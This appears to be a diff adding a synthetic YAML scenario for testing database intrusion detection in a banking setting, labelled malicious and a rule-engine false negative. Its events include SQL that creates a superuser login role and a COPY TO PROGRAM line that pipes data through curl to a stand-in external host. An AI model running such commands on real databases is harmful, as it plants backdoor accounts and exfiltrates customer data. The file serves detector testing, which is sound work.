@@ -1,0 +1,23 @@
+scenario_id: gen_banking_72_data_tamper_mal_2005
+family_id: gen_banking_72_data_tamper_mal_fam2005
+domain: banking
+time_of_day: 03:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: teller
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_782290 SUPERUSER LOGIN PASSWORD 'x323736'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.16.229
+      port: 9443
